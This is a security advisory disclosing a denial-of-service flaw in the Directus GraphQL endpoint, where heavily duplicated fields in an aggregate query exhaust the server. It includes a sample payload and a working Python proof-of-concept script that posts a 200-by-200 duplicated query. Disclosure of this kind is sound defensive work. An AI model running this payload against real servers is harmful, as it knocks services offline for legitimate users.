summary: "Directus GraphQL Field Duplication Denial of Service (DoS)\n### Summary\nA denial\
  \ of service (DoS) attack by field duplication in GraphQL is a type of attack where an attacker\
  \ exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple\
  \ times in a single query. This can cause the server to perform redundant computations and\
  \ consume excessive resources, leading to a denial of service for legitimate users.\n\n###\
  \ Details\nRequest to the endpoint /graphql are sent when visualizing graphs generated at\
  \ a dashboard:\n![image](https://github.com/directus/directus/assets/114263468/185eb60f-9092-47d4-81f4-add1a53e99c8)\n\
  \n![DoS5](https://github.com/directus/directus/assets/114263468/f43079f5-b9ab-4704-938f-dcb91453d464)\n\
  \n\nBy modifying the data sent and duplicating many times the fields a DoS attack is possible.\
  \ \n\n### PoC\nThe goal is to create a payload that generates a body like this, where the\
  \ 'max' field is duplicated many times, each with the 'id' field duplicated many times inside\
  \ it.\n`{'query': 'query { query_4f4722ea: test_table_aggregated { max {id id id id id id\
  \ id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id\
  \  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id\
  \ id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id\
  \ id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id\
  \  }  } }'}`\n\nAlthough that payload seems harmless, a bigger one leaves the service unresponsive.\
  \ \n\nThe following code might serve as a PoC written in Python3:\n```# Field Duplication\
  \ DoS \n# GitHub @asantof\n\nimport requests\n\n## CHANGE THIS VALUES: url, auth_token, query_name,\
  \ collection_name\nurl = 'http://0.0.0.0:8055/graphql'\nauth_token = '' \nquery_name = 'query_XXXXX'\
  \ \ncollection_name = ''  \n\nheaders = {\n    'Content-Type': 'application/json',\n    'Authorization':\
  \ f'Bearer {auth_token}',\n}\n\nid_payload = 'id ' * 200\nmax_payload = 'max {' + id_payload\
  \ + ' } '\nfull_payload = max_payload * 200\n\ndata = {\n    'query': 'query { ' + query_name\
  \ + ': ' + collection_name + '_aggregated { ' + full_payload + ' } }'\n}\n\nprint(data)\n\n\
  response = requests.post(url, headers=headers, json=data)\n\nprint(response.json())\n```\n\
  \n![DoS4](https://github.com/directus/directus/assets/114263468/965e50bc-24dc-405c-a0f1-c973bd4f378d)\n\
  \n\nAfter running it the service will be unresponsive for a while:\n![DoS](https://github.com/directus/directus/assets/114263468/9865acc1-9b82-4d3d-8929-cf32500ce14d)\n\
  \n\n### Impact\nThe vulnerability impacts the service's availability by causing it to become\
  \ unresponsive for a few minutes. An attacker could continuously send this request to the\
  \ server, rendering the service unavailable indefinitely."
